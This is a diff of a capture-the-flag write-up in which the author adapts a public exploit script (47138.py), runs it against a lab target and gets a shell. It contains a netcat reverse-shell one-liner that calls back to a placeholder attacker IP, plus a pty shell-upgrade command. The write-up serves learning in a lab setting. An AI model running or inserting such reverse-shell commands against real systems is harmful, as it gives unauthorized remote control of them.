@@ -55,14 +55,19 @@ Now lets go through our payload and do some changes
 
 
 1)Here I updated the url to our target ip http://<IP>
+
+
 2)Rmoved the proxy payload as I was not using burpsuite for this machine because I didn’t need to intercept the traffic.
+
+
 3)To check if the exploit was actually sending requests and getting a valid response, I added:
+
 
 ```
 r = requests.get(burp0_url)
 ```
 
-
+## 🧨 Payload Execution 
 Now lets execute the payload 
 
 Just make sure you have a Netcat listener ready before running the reverse shell:
@@ -76,8 +81,59 @@ python3 47138.py http://<IP>
 
 ```
 
+Alrigt we got our output 
 
-Alrigt we got 
+we didnt get any reverse shell here we can see **CMD**
+
+It's just a label in the script's output, showing what command was issued.
+
+To bypass this I copied a netcat revershell command from pentest monkey 
+
+```
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER IP> 4444 > /tmp/f
+```
+
+<img width="1209" height="112" alt="Screenshot 2025-08-03 003305" src="https://github.com/user-attachments/assets/c138785c-4dd1-4f3b-b8b9-463b41b95ece" />
+
+
+rm /tmp/f; mkfifo /tmp/f: Removes any existing pipe, then creates a new named pipe.
+
+cat /tmp/f | /bin/sh -i: Sets up a shell to read from the pipe.
+
+
+Less goo,we got the reverse shell
+
+
+<img width="650" height="128" alt="Screenshot 2025-08-03 003314" src="https://github.com/user-attachments/assets/9e93e390-9ef7-41dc-b5aa-503acd114a13" />
+
+
+
+**First of all lets upgrade the shell**
+
+The initial reverse shell was limited — no TTY, no proper terminal control. To fix that, I upgraded the shell using Python:
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+Now lets go through the target machine and Find the flags
+
+
+I found the User.txt flag in /home/www-data
+
+
+www-data is a low priviledge user system
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
